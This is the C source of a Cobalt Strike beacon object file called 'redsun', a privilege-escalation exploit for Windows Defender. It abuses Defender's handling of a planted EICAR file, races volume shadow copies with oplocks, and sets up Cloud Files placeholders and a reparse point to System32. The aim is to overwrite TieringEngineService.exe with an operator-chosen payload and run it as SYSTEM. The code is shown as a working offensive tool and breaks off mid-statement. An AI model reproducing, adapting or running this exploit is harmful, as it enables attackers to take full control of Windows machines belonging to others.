/*
 * redsun.c - RedSun Privilege Escalation BOF
 *
 * Exploits Windows Defender's cloud-tag file restore behaviour to overwrite
 * TieringEngineService.exe with an arbitrary payload, then triggers the
 * service via COM for SYSTEM code execution.
 *
 * Based on: https://github.com/Nightmare-Eclipse/RedSun
 * Requires: Windows Defender with real-time protection enabled,
 *           Volume Shadow Copy Service running, x64 beacon.
 *
 * Usage: redsun /payload:C:\path\to\payload.exe
 *        redsun /payload:C:\Windows\System32\cmd.exe  (for quick test)
 */

#include "beacon.h"

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <cfapi.h>

/* ── NT disposition / create-options not always exposed in user-mode headers ── */
#ifndef FILE_SUPERSEDE
#define FILE_SUPERSEDE         0x00000000
#define FILE_OPEN              0x00000001
#define FILE_OPEN_IF           0x00000003
#endif
#ifndef FILE_DIRECTORY_FILE
#define FILE_DIRECTORY_FILE       0x00000001
#define FILE_DELETE_ON_CLOSE      0x00001000
#endif

/* ── Supplemental NT structures ─────────────────────────────────────────────── */

typedef struct _RS_FILE_DISPOSITION_EX {
    ULONG Flags;
} RS_FILE_DISPOSITION_EX;

typedef struct _RS_FILE_RENAME_INFO {
    union { BOOLEAN ReplaceIfExists; ULONG Flags; };
    HANDLE  RootDirectory;
    ULONG   FileNameLength;
    WCHAR   FileName[1];
} RS_FILE_RENAME_INFO, *PRS_FILE_RENAME_INFO;

typedef struct _RS_OBJ_DIR_INFO {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} RS_OBJ_DIR_INFO, *PRS_OBJ_DIR_INFO;

typedef struct _RS_REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
        struct { UCHAR DataBuffer[1]; } GenericReparseBuffer;
    };
} RS_REPARSE_DATA_BUFFER, *PRS_REPARSE_DATA_BUFFER;

#define RS_REPARSE_HDR_LEN FIELD_OFFSET(RS_REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

/* ── Function pointer typedefs ──────────────────────────────────────────────── */

/* ntdll */
typedef NTSTATUS (WINAPI *PFN_NtOpenDirectoryObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (WINAPI *PFN_NtQueryDirectoryObject)(HANDLE, PVOID, ULONG, BOOLEAN, BOOLEAN, PULONG, PULONG);
typedef NTSTATUS (WINAPI *PFN_NtSetInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
typedef VOID     (WINAPI *PFN_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS (WINAPI *PFN_NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                                             PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG,
                                             ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (WINAPI *PFN_NtClose)(HANDLE);

/* synch (kernelbase) */
typedef BOOL (WINAPI *PFN_WaitOnAddress)(volatile VOID*, PVOID, SIZE_T, DWORD);
typedef VOID (WINAPI *PFN_WakeByAddressAll)(PVOID);

/* CldApi */
typedef HRESULT (WINAPI *PFN_CfRegisterSyncRoot)(LPCWSTR, const CF_SYNC_REGISTRATION*,
                                                  const CF_SYNC_POLICIES*, CF_REGISTER_FLAGS);
typedef HRESULT (WINAPI *PFN_CfConnectSyncRoot)(LPCWSTR, const CF_CALLBACK_REGISTRATION*,
                                                 const VOID*, CF_CONNECT_FLAGS, CF_CONNECTION_KEY*);
typedef HRESULT (WINAPI *PFN_CfCreatePlaceholders)(LPCWSTR, CF_PLACEHOLDER_CREATE_INFO*,
                                                    DWORD, CF_CREATE_FLAGS, PDWORD);

/* ole32 / oleaut32 */
typedef HRESULT (WINAPI *PFN_CoInitialize)(LPVOID);
typedef HRESULT (WINAPI *PFN_CoCreateInstance)(const GUID*, LPUNKNOWN, DWORD, const GUID*, LPVOID*);
typedef VOID    (WINAPI *PFN_CoUninitialize)(VOID);
typedef HRESULT (WINAPI *PFN_CoCreateGuid)(GUID*);
typedef int     (WINAPI *PFN_StringFromGUID2)(const GUID*, LPOLESTR, int);

/* ── Thread context (replaces all globals from the original) ────────────────── */

typedef struct _REDSUN_CTX {
    /* NT functions */
    PFN_NtOpenDirectoryObject   NtOpenDirectoryObject;
    PFN_NtQueryDirectoryObject  NtQueryDirectoryObject;
    PFN_NtSetInformationFile    NtSetInformationFile;
    PFN_RtlInitUnicodeString    RtlInitUnicodeString;
    PFN_NtCreateFile            NtCreateFile;
    PFN_NtClose                 NtClose;
    /* synch */
    PFN_WakeByAddressAll        WakeByAddressAll;
    /* signalling */
    volatile HANDLE             gevent;   /* set to NULL by thread when done */
    /* target path for shadow-copy race */
    wchar_t                     foo[MAX_PATH];
} REDSUN_CTX;

/* ── VSS linked list ─────────────────────────────────────────────────────────── */

typedef struct _LLVSS {
    wchar_t*      name;
    struct _LLVSS* next;
} LLVSS;

static void vss_free(LLVSS* head) {
    while (head) {
        HeapFree(GetProcessHeap(), 0, head->name);
        LLVSS* nxt = head->next;
        HeapFree(GetProcessHeap(), 0, head);
        head = nxt;
    }
}

static LLVSS* vss_snapshot(HANDLE hobjdir, BOOLEAN* err, int* cnt, REDSUN_CTX* ctx) {
    *cnt = 0;
    ULONG scanctx = 0;
    ULONG reqsz   = sizeof(RS_OBJ_DIR_INFO) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz   = 0;

    PRS_OBJ_DIR_INFO buf = (PRS_OBJ_DIR_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reqsz);
    if (!buf) { *err = TRUE; return NULL; }

    NTSTATUS stat;
    do {
        stat = ctx->NtQueryDirectoryObject(hobjdir, buf, reqsz, FALSE, FALSE, &scanctx, &retsz);
        if (stat == STATUS_SUCCESS) break;
        if (stat != STATUS_MORE_ENTRIES) {
            BeaconPrintf(CALLBACK_ERROR, "redsun: NtQueryDirectoryObject: 0x%08X\n", stat);
            HeapFree(GetProcessHeap(), 0, buf);
            *err = TRUE; return NULL;
        }
        HeapFree(GetProcessHeap(), 0, buf);
        reqsz += sizeof(RS_OBJ_DIR_INFO) + 0x100;
        buf = (PRS_OBJ_DIR_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reqsz);
        if (!buf) { *err = TRUE; return NULL; }
    } while (1);

    RS_OBJ_DIR_INFO empty;
    ZeroMemory(&empty, sizeof(empty));

    LLVSS* head = NULL;
    LLVSS* tail = NULL;
    wchar_t pfx[] = L"HarddiskVolumeShadowCopy";

    for (ULONG i = 0; i < ULONG_MAX; i++) {
        if (memcmp(&buf[i], &empty, sizeof(RS_OBJ_DIR_INFO)) == 0) break;
        if (lstrcmpiW(L"Device", buf[i].TypeName.Buffer) == 0 &&
            buf[i].Name.Length >= sizeof(pfx) &&
            memcmp(pfx, buf[i].Name.Buffer, sizeof(pfx) - sizeof(wchar_t)) == 0)
        {
            (*cnt)++;
            LLVSS* node = (LLVSS*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LLVSS));
            if (!node) { *err = TRUE; vss_free(head); HeapFree(GetProcessHeap(), 0, buf); return NULL; }
            node->name = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                              buf[i].Name.Length + sizeof(wchar_t));
            if (!node->name) {
                HeapFree(GetProcessHeap(), 0, node);
                *err = TRUE; vss_free(head); HeapFree(GetProcessHeap(), 0, buf); return NULL;
            }
            memmove(node->name, buf[i].Name.Buffer, buf[i].Name.Length);
            if (tail) { tail->next = node; tail = node; }
            else       { head = tail = node; }
        }
    }

    HeapFree(GetProcessHeap(), 0, buf);
    return head;
}

/* ── Reverse a char string in-place (for EICAR) ─────────────────────────────── */

static void rev(char* s) {
    int l = 0, r = lstrlenA(s) - 1;
    while (l < r) {
        char t = s[l]; s[l] = s[r]; s[r] = t;
        l++; r--;
    }
}

/* ── Shadow copy finder thread ───────────────────────────────────────────────── */

static DWORD WINAPI ShadowCopyFinderThread(LPVOID param) {
    REDSUN_CTX* ctx = (REDSUN_CTX*)param;

    wchar_t devpath[] = L"\\Device";
    UNICODE_STRING udev = { 0 };
    ctx->RtlInitUnicodeString(&udev, devpath);
    OBJECT_ATTRIBUTES oa = { 0 };
    InitializeObjectAttributes(&oa, &udev, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hobjdir = NULL;
    NTSTATUS stat = ctx->NtOpenDirectoryObject(&hobjdir, 0x0001, &oa);
    if (stat) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: NtOpenDirectoryObject: 0x%08X\n", stat);
        return 1;
    }

    BOOLEAN err = FALSE;
    int cnt = 0;
    LLVSS* baseline = vss_snapshot(hobjdir, &err, &cnt, ctx);
    if (err) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: Failed to snapshot VSS baseline\n");
        ctx->NtClose(hobjdir);
        return 1;
    }

    ULONG reqsz = sizeof(RS_OBJ_DIR_INFO) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz = 0;
    PRS_OBJ_DIR_INFO buf = (PRS_OBJ_DIR_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reqsz);
    if (!buf) {
        vss_free(baseline);
        ctx->NtClose(hobjdir);
        return 1;
    }

    BOOLEAN restartscan = FALSE;
    BOOLEAN found = FALSE;
    wchar_t newvss[MAX_PATH] = { 0 };
    lstrcpyW(newvss, L"\\Device\\");
    wchar_t pfx[] = L"HarddiskVolumeShadowCopy";

scanagain:
    do {
        ULONG scanctx = 0;
        stat = ctx->NtQueryDirectoryObject(hobjdir, buf, reqsz, FALSE, restartscan, &scanctx, &retsz);
        if (stat == STATUS_SUCCESS) break;
        if (stat != STATUS_MORE_ENTRIES) {
            BeaconPrintf(CALLBACK_ERROR, "redsun: NtQueryDirectoryObject (scan): 0x%08X\n", stat);
            HeapFree(GetProcessHeap(), 0, buf);
            vss_free(baseline);
            ctx->NtClose(hobjdir);
            return 1;
        }
        HeapFree(GetProcessHeap(), 0, buf);
        reqsz += sizeof(RS_OBJ_DIR_INFO) + 0x100;
        buf = (PRS_OBJ_DIR_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reqsz);
        if (!buf) {
            vss_free(baseline);
            ctx->NtClose(hobjdir);
            return 1;
        }
    } while (1);

    RS_OBJ_DIR_INFO empty;
    ZeroMemory(&empty, sizeof(empty));

    for (ULONG i = 0; i < ULONG_MAX; i++) {
        if (memcmp(&buf[i], &empty, sizeof(RS_OBJ_DIR_INFO)) == 0) break;
        if (lstrcmpiW(L"Device", buf[i].TypeName.Buffer) == 0 &&
            buf[i].Name.Length >= sizeof(pfx) &&
            memcmp(pfx, buf[i].Name.Buffer, sizeof(pfx) - sizeof(wchar_t)) == 0)
        {
            LLVSS* cur = baseline;
            BOOLEAN match = FALSE;
            while (cur) {
                if (lstrcmpiW(cur->name, buf[i].Name.Buffer) == 0) { match = TRUE; break; }
                cur = cur->next;
            }
            if (!match) {
                lstrcatW(newvss, buf[i].Name.Buffer);
                found = TRUE;
                break;
            }
        }
    }

    if (!found) {
        restartscan = TRUE;
        goto scanagain;
    }

    HeapFree(GetProcessHeap(), 0, buf);
    vss_free(baseline);
    ctx->NtClose(hobjdir);

    /* Open target file inside the new shadow copy */
    wchar_t malpath[MAX_PATH] = { 0 };
    lstrcpyW(malpath, newvss);
    lstrcatW(malpath, &ctx->foo[2]);   /* skip "C:" drive prefix */

    UNICODE_STRING umal = { 0 };
    ctx->RtlInitUnicodeString(&umal, malpath);
    OBJECT_ATTRIBUTES oa2 = { 0 };
    InitializeObjectAttributes(&oa2, &umal, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat = { 0 };
    HANDLE hlk = NULL;

retry:
    stat = ctx->NtCreateFile(&hlk, DELETE | SYNCHRONIZE, &oa2, &iostat,
                              NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, 0, NULL, 0);
    if (stat == STATUS_NO_SUCH_DEVICE) goto retry;
    if (stat) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: NtCreateFile (shadow): 0x%08X\n", stat);
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "redsun: The sun is shinning...\n");

    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    DeviceIoControl(hlk, FSCTL_REQUEST_BATCH_OPLOCK, NULL, 0, NULL, 0, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: FSCTL_REQUEST_BATCH_OPLOCK failed: %d\n", GetLastError());
        CloseHandle(ovd.hEvent);
        ctx->NtClose(hlk);
        return 1;
    }

    DWORD nbytes = 0;
    SetEvent((HANDLE)ctx->gevent);
    ResetEvent((HANDLE)ctx->gevent);
    GetOverlappedResult(hlk, &ovd, &nbytes, TRUE);

    WaitForSingleObject((HANDLE)ctx->gevent, INFINITE);

    ctx->NtClose(hlk);
    CloseHandle(ovd.hEvent);

    /* Null gevent and wake main thread */
    HANDLE tmp = (HANDLE)ctx->gevent;
    ctx->gevent = NULL;
    ctx->WakeByAddressAll((PVOID)&ctx->gevent);
    CloseHandle(tmp);

    return ERROR_SUCCESS;
}

/* ── Cloud placeholder setup ─────────────────────────────────────────────────── */

static void do_cloud_stuff(
    wchar_t* syncroot, wchar_t* filename, DWORD filesz,
    PFN_CfRegisterSyncRoot    CfRegisterSyncRoot,
    PFN_CfConnectSyncRoot     CfConnectSyncRoot,
    PFN_CfCreatePlaceholders  CfCreatePlaceholders,
    PFN_CoCreateGuid          CoCreateGuid,
    PFN_StringFromGUID2       StringFromGUID2)
{
    CF_SYNC_REGISTRATION cfreg = { 0 };
    cfreg.StructSize    = sizeof(CF_SYNC_REGISTRATION);
    cfreg.ProviderName  = L"SERIOUSLYMSFT";
    cfreg.ProviderVersion = L"1.0";

    CF_SYNC_POLICIES pol = { 0 };
    pol.StructSize              = sizeof(CF_SYNC_POLICIES);
    pol.HardLink                = CF_HARDLINK_POLICY_ALLOWED;
    pol.Hydration.Primary       = CF_HYDRATION_POLICY_PARTIAL;
    pol.Hydration.Modifier      = CF_HYDRATION_POLICY_MODIFIER_NONE;
    pol.PlaceholderManagement   = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    pol.InSync                  = CF_INSYNC_POLICY_NONE;

    HRESULT hr = CfRegisterSyncRoot(syncroot, &cfreg, &pol,
                                     CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: CfRegisterSyncRoot: 0x%08X\n", hr);
        return;
    }

    CF_CALLBACK_REGISTRATION cbs[1];
    cbs[0].Type     = CF_CALLBACK_TYPE_NONE;
    cbs[0].Callback = NULL;
    CF_CONNECTION_KEY cfkey = { 0 };
    hr = CfConnectSyncRoot(syncroot, cbs, NULL,
                            CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO |
                            CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: CfConnectSyncRoot: 0x%08X\n", hr);
        return;
    }

    FILE_BASIC_INFO fbi = { 0 };
    fbi.FileAttributes = FILE_ATTRIBUTE_NORMAL;

    CF_FS_METADATA meta = { 0 };
    meta.BasicInfo          = fbi;
    meta.FileSize.QuadPart  = filesz;

    GUID uid = { 0 };
    wchar_t wuid[100] = { 0 };
    CoCreateGuid(&uid);
    StringFromGUID2(&uid, wuid, 100);

    CF_PLACEHOLDER_CREATE_INFO ph[1];
    ZeroMemory(ph, sizeof(ph));
    ph[0].RelativeFileName    = filename;
    ph[0].FsMetadata          = meta;
    ph[0].FileIdentity        = wuid;
    ph[0].FileIdentityLength  = (DWORD)(lstrlenW(wuid) * sizeof(wchar_t));
    ph[0].Flags               = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE |
                                CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;

    DWORD processed = 0;
    hr = CfCreatePlaceholders(syncroot, ph, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processed);
    if (FAILED(hr))
        BeaconPrintf(CALLBACK_ERROR, "redsun: CfCreatePlaceholders: 0x%08X\n", hr);
}

/* ── BOF entry point ─────────────────────────────────────────────────────────── */

void go(char* args, int len) {

    /* ── Parse /payload: argument ── */
    datap parser;
    BeaconDataParse(&parser, args, len);
    char* argstr = BeaconDataExtract(&parser, NULL);

    wchar_t payloadW[MAX_PATH] = { 0 };
    if (argstr) {
        char* p = argstr;
        /* find /payload: (case-insensitive by manual scan) */
        while (*p) {
            if ((p[0]=='/'||p[0]=='-') &&
                (p[1]=='p'||p[1]=='P') &&
                (p[2]=='a'||p[2]=='A') &&
                (p[3]=='y'||p[3]=='Y') &&
                (p[4]=='l'||p[4]=='L') &&
                (p[5]=='o'||p[5]=='O') &&
                (p[6]=='a'||p[6]=='A') &&
                (p[7]=='d'||p[7]=='D') &&
                p[8] == ':')
            {
                char* val = p + 9;
                int   vlen = lstrlenA(val);
                /* strip trailing whitespace */
                while (vlen > 0 && (val[vlen-1]==' ' || val[vlen-1]=='\t')) vlen--;
                MultiByteToWideChar(CP_ACP, 0, val, vlen, payloadW, MAX_PATH - 1);
                break;
            }
            p++;
        }
    }

    if (!payloadW[0]) {
        BeaconPrintf(CALLBACK_ERROR,
            "redsun: Usage: redsun /payload:C:\\path\\to\\payload.exe\n");
        return;
    }

    /* ── Load modules ── */
    HMODULE hntdll     = GetModuleHandleA("ntdll.dll");
    HMODULE hkernbase  = LoadLibraryA("kernelbase.dll");
    HMODULE hcldapi    = LoadLibraryA("CldApi.dll");
    HMODULE hole32     = LoadLibraryA("ole32.dll");
    HMODULE holeaut32  = LoadLibraryA("oleaut32.dll");

    if (!hntdll || !hkernbase || !hcldapi || !hole32 || !holeaut32) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: Failed to load required DLLs\n");
        if (hkernbase) FreeLibrary(hkernbase);
        if (hcldapi)   FreeLibrary(hcldapi);
        if (hole32)    FreeLibrary(hole32);
        if (holeaut32) FreeLibrary(holeaut32);
        return;
    }

    /* ── Resolve NT functions ── */
    PFN_NtOpenDirectoryObject  NtOpenDirectoryObject  = (PFN_NtOpenDirectoryObject) GetProcAddress(hntdll, "NtOpenDirectoryObject");
    PFN_NtQueryDirectoryObject NtQueryDirectoryObject = (PFN_NtQueryDirectoryObject)GetProcAddress(hntdll, "NtQueryDirectoryObject");
    PFN_NtSetInformationFile   NtSetInformationFile   = (PFN_NtSetInformationFile)  GetProcAddress(hntdll, "NtSetInformationFile");
    PFN_RtlInitUnicodeString   RtlInitUnicodeString   = (PFN_RtlInitUnicodeString)  GetProcAddress(hntdll, "RtlInitUnicodeString");
    PFN_NtCreateFile           NtCreateFile           = (PFN_NtCreateFile)          GetProcAddress(hntdll, "NtCreateFile");
    PFN_NtClose                NtClose                = (PFN_NtClose)               GetProcAddress(hntdll, "NtClose");

    /* ── Resolve synch functions ── */
    PFN_WaitOnAddress   WaitOnAddress   = (PFN_WaitOnAddress)  GetProcAddress(hkernbase, "WaitOnAddress");
    PFN_WakeByAddressAll WakeByAddressAll = (PFN_WakeByAddressAll)GetProcAddress(hkernbase, "WakeByAddressAll");

    /* ── Resolve CfApi functions ── */
    PFN_CfRegisterSyncRoot   CfRegisterSyncRoot   = (PFN_CfRegisterSyncRoot)  GetProcAddress(hcldapi, "CfRegisterSyncRoot");
    PFN_CfConnectSyncRoot    CfConnectSyncRoot    = (PFN_CfConnectSyncRoot)   GetProcAddress(hcldapi, "CfConnectSyncRoot");
    PFN_CfCreatePlaceholders CfCreatePlaceholders = (PFN_CfCreatePlaceholders)GetProcAddress(hcldapi, "CfCreatePlaceholders");

    /* ── Resolve COM functions ── */
    PFN_CoInitialize    CoInitialize    = (PFN_CoInitialize)   GetProcAddress(hole32,    "CoInitialize");
    PFN_CoCreateInstance CoCreateInstance = (PFN_CoCreateInstance)GetProcAddress(hole32, "CoCreateInstance");
    PFN_CoUninitialize  CoUninitialize  = (PFN_CoUninitialize) GetProcAddress(hole32,    "CoUninitialize");
    PFN_CoCreateGuid    CoCreateGuid    = (PFN_CoCreateGuid)   GetProcAddress(hole32,    "CoCreateGuid");
    PFN_StringFromGUID2 StringFromGUID2 = (PFN_StringFromGUID2)GetProcAddress(holeaut32, "StringFromGUID2");

    if (!NtOpenDirectoryObject || !NtQueryDirectoryObject || !NtSetInformationFile ||
        !RtlInitUnicodeString  || !NtCreateFile           || !NtClose              ||
        !WaitOnAddress         || !WakeByAddressAll        ||
        !CfRegisterSyncRoot    || !CfConnectSyncRoot       || !CfCreatePlaceholders ||
        !CoInitialize          || !CoCreateInstance        || !CoUninitialize       ||
        !CoCreateGuid          || !StringFromGUID2)
    {
        BeaconPrintf(CALLBACK_ERROR, "redsun: Failed to resolve one or more required APIs\n");
        goto cleanup;
    }

    /* ── Create named pipe (used to track session ID for console spawn) ── */
    HANDLE hpipe = CreateNamedPipeW(
        L"\\\\.\\pipe\\REDSUN",
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        0, 1, 0, 0, 0, NULL);
    if (hpipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: CreateNamedPipe: %d\n", GetLastError());
        goto cleanup;
    }

    /* ── Build %TEMP%\RS-{GUID} working directory ── */
    wchar_t workdir[MAX_PATH] = { 0 };
    ExpandEnvironmentStringsW(L"%TEMP%\\RS-", workdir, MAX_PATH);

    GUID uid = { 0 };
    wchar_t wuid[100] = { 0 };
    CoCreateGuid(&uid);
    StringFromGUID2(&uid, wuid, 100);
    lstrcatW(workdir, wuid);

    wchar_t target_name[] = L"TieringEngineService.exe";
    wchar_t foo[MAX_PATH] = { 0 };
    wsprintfW(foo, L"%ws\\%ws", workdir, target_name);

    /* ── Initialise thread context ── */
    HANDLE gevent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!gevent) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: CreateEvent: %d\n", GetLastError());
        CloseHandle(hpipe);
        goto cleanup;
    }

    REDSUN_CTX ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.NtOpenDirectoryObject  = NtOpenDirectoryObject;
    ctx.NtQueryDirectoryObject = NtQueryDirectoryObject;
    ctx.NtSetInformationFile   = NtSetInformationFile;
    ctx.RtlInitUnicodeString   = RtlInitUnicodeString;
    ctx.NtCreateFile           = NtCreateFile;
    ctx.NtClose                = NtClose;
    ctx.WakeByAddressAll       = WakeByAddressAll;
    ctx.gevent                 = gevent;
    lstrcpyW(ctx.foo, foo);

    /* ── Start shadow copy watcher thread ── */
    DWORD tid = 0;
    HANDLE hthread = CreateThread(NULL, 0, ShadowCopyFinderThread, &ctx, 0, &tid);
    if (!hthread) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: CreateThread: %d\n", GetLastError());
        CloseHandle(gevent);
        CloseHandle(hpipe);
        goto cleanup;
    }

    /* ── Create work directory ── */
    if (!CreateDirectoryW(workdir, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: CreateDirectory: %d\n", GetLastError());
        CloseHandle(hthread);
        CloseHandle(gevent);
        CloseHandle(hpipe);
        goto cleanup;
    }

    /* ── Write reversed EICAR to work file ── */
    HANDLE hfile = CreateFileW(foo,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hfile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: CreateFile (eicar): %d\n", GetLastError());
        CloseHandle(hthread);
        CloseHandle(gevent);
        CloseHandle(hpipe);
        goto cleanup;
    }

    char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
    rev(eicar);
    DWORD nwf = 0;
    WriteFile(hfile, eicar, (DWORD)lstrlenA(eicar), &nwf, NULL);

    /* Poke the file to trigger AV scan */
    HANDLE htrig = CreateFileW(foo,
        GENERIC_READ | FILE_EXECUTE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (htrig != INVALID_HANDLE_VALUE) CloseHandle(htrig);

    BeaconPrintf(CALLBACK_OUTPUT, "redsun: Waiting for Defender response (120s timeout)...\n");

    if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0) {
        BeaconPrintf(CALLBACK_ERROR,
            "redsun: Timed out - is real-time protection enabled?\n");
        CloseHandle(hfile);
        CloseHandle(hthread);
        CloseHandle(gevent);
        CloseHandle(hpipe);
        goto cleanup;
    }

    /* ── Mark EICAR file for deletion ── */
    IO_STATUS_BLOCK iostat = { 0 };
    RS_FILE_DISPOSITION_EX fdiex = { 0x00000001 | 0x00000002 };
    NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
    CloseHandle(hfile);
    hfile = NULL;

    /* ── Register cloud sync root / placeholder ── */
    do_cloud_stuff(workdir, target_name, (DWORD)lstrlenA(eicar),
                   CfRegisterSyncRoot, CfConnectSyncRoot, CfCreatePlaceholders,
                   CoCreateGuid, StringFromGUID2);

    /* ── Unblock the shadow copy thread ── */
    SetEvent(gevent);

    /* Wait for thread to null gevent */
    WaitOnAddress((volatile VOID*)&ctx.gevent, (PVOID)&ctx.gevent, sizeof(HANDLE), INFINITE);

    /* ── Re-open spoof file via NT path ── */
    wchar_t ntfoo[MAX_PATH] = L"\\??\\";
    lstrcatW(ntfoo, foo);
    UNICODE_STRING _ufoo = { 0 };
    RtlInitUnicodeString(&_ufoo, ntfoo);
    OBJECT_ATTRIBUTES _oa = { 0 };
    InitializeObjectAttributes(&_oa, &_ufoo, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Rename working directory out of the way */
    wchar_t tmp_path[MAX_PATH] = { 0 };
    wsprintfW(tmp_path, L"%s.TMP", workdir);
    MoveFileExW(workdir, tmp_path, MOVEFILE_REPLACE_EXISTING);

    if (!CreateDirectoryW(workdir, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: Re-create workdir: %d\n", GetLastError());
        CloseHandle(hthread);
        CloseHandle(hpipe);
        goto cleanup;
    }

    LARGE_INTEGER fsz = { 0 };
    fsz.QuadPart = 0x1000;
    ZeroMemory(&iostat, sizeof(iostat));
    NTSTATUS stat = NtCreateFile(&hfile,
        FILE_READ_DATA | DELETE | SYNCHRONIZE, &_oa, &iostat,
        &fsz, FILE_ATTRIBUTE_READONLY, FILE_SHARE_READ,
        FILE_SUPERSEDE, 0, NULL, 0);
    if (stat) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: NtCreateFile (spoof reopen): 0x%08X\n", stat);
        CloseHandle(hthread);
        CloseHandle(hpipe);
        goto cleanup;
    }

    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, 0, NULL, 0, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: batch oplock (2): %d\n", GetLastError());
        CloseHandle(ovd.hEvent);
        NtClose(hfile);
        CloseHandle(hthread);
        CloseHandle(hpipe);
        goto cleanup;
    }

    HANDLE hmap  = CreateFileMappingW(hfile, NULL, PAGE_READONLY, 0, 0, NULL);
    PVOID  maddr = MapViewOfFile(hmap, FILE_MAP_READ, 0, 0, 0);
    DWORD  nb    = 0;
    GetOverlappedResult(hfile, &ovd, &nb, TRUE);
    UnmapViewOfFile(maddr);
    CloseHandle(hmap);

    /* Rename the re-opened spoof file and mark for deletion */
    {
        wchar_t tmp2[MAX_PATH] = { 0 };
        wsprintfW(tmp2, L"\\??\\%s.TEMP2", workdir);
        SIZE_T namesz = (SIZE_T)(lstrlenW(tmp2) * sizeof(wchar_t));
        PRS_FILE_RENAME_INFO pfri = (PRS_FILE_RENAME_INFO)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY,
            sizeof(RS_FILE_RENAME_INFO) + namesz);
        if (pfri) {
            pfri->ReplaceIfExists  = TRUE;
            pfri->FileNameLength   = (ULONG)namesz;
            memmove(&pfri->FileName[0], tmp2, namesz);
            ZeroMemory(&iostat, sizeof(iostat));
            NtSetInformationFile(hfile, &iostat, pfri,
                (ULONG)(sizeof(RS_FILE_RENAME_INFO) + namesz),
                (FILE_INFORMATION_CLASS)10);
            NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
            HeapFree(GetProcessHeap(), 0, pfri);
        }
    }

    /* ── Open working directory and set mount-point reparse to System32 ── */
    wchar_t rp_nt[MAX_PATH] = L"\\??\\";
    lstrcatW(rp_nt, workdir);
    UNICODE_STRING _urp = { 0 };
    RtlInitUnicodeString(&_urp, rp_nt);
    InitializeObjectAttributes(&_oa, &_urp, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hrp = NULL;
    ZeroMemory(&iostat, sizeof(iostat));
    stat = NtCreateFile(&hrp,
